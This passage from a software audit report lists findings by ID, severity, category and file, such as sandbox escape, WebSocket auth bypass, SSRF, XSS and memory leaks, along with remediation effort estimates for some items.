| I-4/I-5 | Store keys in ArrayBuffer; add HMAC to export | Key exposure in memory | 8 hours |
| I-18 | Replace writeFileSync with async write | Event loop blocking | 1 hour |
| I-20 | Add WebSocket connection rate limiting | DoS vulnerability | 3 hours |
| I-3 | Combine request data listeners; add boolean guard | Data corruption | 2 hours |

---

## Complete Findings Index

| ID | Severity | Category | File | Description |
|----|----------|----------|------|-------------|
| C-1 | CRITICAL | Config | docker/nginx.conf | nginx uses shell syntax - deployment broken |
| C-2 | CRITICAL | Sandbox Escape | sandbox.worker.ts | new Function() bypasses AST validation |
| C-3 | CRITICAL | Auth Bypass | sync-server.mjs | WebSocket auth bypass when SYNC_SECRET empty |
| C-4 | CRITICAL | Auth/Logic | sqlite-storage.ts | WebSocket cannot pass auth headers |
| C-5 | CRITICAL | Integrity | debate-api.ts | Global window.fetch monkey-patch |
| C-6 | CRITICAL | XSS | CodeRunner.tsx | Blocklist-based HTML sanitizer bypassable |
| C-7 | CRITICAL | Missing Auth | admin-service.ts | No authorization on destructive operations |
| C-8 | CRITICAL | Data Exposure | sync-server.mjs | Error messages leak internal details |
| C-9 | CRITICAL | Data Integrity | memory-repository.ts | Non-deterministic IDs - always inserts |
| C-10 | CRITICAL | Data Integrity | database-service.ts | chatMessages table orphaned |
| C-11 | CRITICAL | Memory Leak | debateLiveStore.ts | Event subscriptions never cleaned up |
| C-12 | CRITICAL | Memory Leak | MarkdownRenderer.tsx | highlightCache stores React elements |
| C-13 | CRITICAL | Race Condition | useChatStore.ts | sendMessage allows duplicate sends |
| C-14 | CRITICAL | Data Loss | main.tsx | beforeunload async handler unreliable |
| C-15 | CRITICAL | Insecure Defaults | nginx.conf | CSP allows unsafe-inline/unsafe-eval |
| I-1 | IMPORTANT | SSRF | cors-proxy.mjs | Duplicate isPrivateIP + DNS TOCTOU |
| I-2 | IMPORTANT | Missing Auth | cors-proxy.mjs | No auth/rate limiting on CORS proxy |
| I-3 | IMPORTANT | Race Condition | sync-server.mjs | Write queue race on payload size limit |
| I-4 | IMPORTANT | Data Exposure | key-vault.ts | Plaintext keys not securely zeroed |
| I-5 | IMPORTANT | Weak Crypto | key-service.ts | Export lacks holistic integrity check |
| I-6 | IMPORTANT | SSRF | sandbox-service.ts | 172.17-172.31 range not blocked |
| I-7 | IMPORTANT | Input Validation | database-service.ts | Arbitrary data injection via import |
| I-8 | IMPORTANT | Missing Auth | compromise-webhook-service.ts | No webhook signature verification |
| I-9 | IMPORTANT | Resource Leak | resumable-stream.ts | Completed streams never removed |
| I-10 | IMPORTANT | Data Integrity | DAL repositories | Caches never invalidate |
| I-11 | IMPORTANT | Security | MarkdownRenderer.tsx | Tracking pixel injection via image URLs |
| I-12 | IMPORTANT | State Mgmt | SettingsPanel.tsx | Stale closure in updateSetting |
| I-13 | IMPORTANT | Memory Leak | VoiceButton.tsx | SpeechRecognition not stopped on unmount |
| I-14 | IMPORTANT | Resource Leak | debate-service.ts | AbortController never stored/cancellable |
| I-15 | IMPORTANT | Race Condition | useRoutingIntelligence.ts | No unmount guard on async actions |
| I-16 | IMPORTANT | Race Condition | useAquariumEngine.ts | Direct ref mutation bypasses React state |
| I-17 | IMPORTANT | Performance | dexie-storage.ts | queryEntries uses wrong index |
| I-18 | IMPORTANT | Performance | sync-server.mjs | Synchronous file I/O blocks event loop |
| I-19 | IMPORTANT | Data Integrity | database-service.ts | Validation hooks allow invalid data |
| I-20 | IMPORTANT | Security | sync-server.mjs | No rate limiting on WebSocket connections |
| M-1 | MINOR | Memory Leak | rewind-service.ts | Interval never cleared |
| M-2 | MINOR | Race Condition | health-service.ts | Concurrency race in checkAll() |
| M-3 | MINOR | Configuration | sync-server.mjs | Hardcoded CORS origins |
| M-4 | MINOR | Configuration | cors-proxy.mjs | Hardcoded localhost CORS |
| M-5 | MINOR | Dev Exposure | useKeyStore.ts | Dev globals expose key recovery |
| M-6 | MINOR | Logic Error | monitoring-service.ts | Partial init state on error |
| M-7 | MINOR | Input Validation | tool-executor.ts | Web tools have no domain restriction |
| M-8 | MINOR | Insecure Defaults | mcp-service.ts | Default servers use HTTP |
| M-9 | MINOR | Performance | usePoolStatus.ts | JSON.stringify equality check |
| M-10 | MINOR | UX Bug | LiveWorkspace.tsx | Array index as key for prepend list |
| M-11 | MINOR | Performance/UX | App.tsx | ErrorBoundary key causes full remount |
| M-12 | MINOR | Memory Leak | AlertLayer.tsx | addToast may fire after unmount |
| M-13 | MINOR | Error Handling | useSystemStatus.ts | No try/catch for getStatus() |
| M-14 | MINOR | Performance | data-access-layer.ts | KvRepository.list() full table scan |
| M-15 | MINOR | Performance | memory-repository.ts | search() is O(n) linear scan |
| M-16 | MINOR | Resource Leak | sqlite-storage.ts | WebSocket reconnect without backoff |
| M-17 | MINOR | Security | security.ts | Salt stored in localStorage |
| M-18 | MINOR | Logic Error | seed.ts | Imports from non-existent paths |
```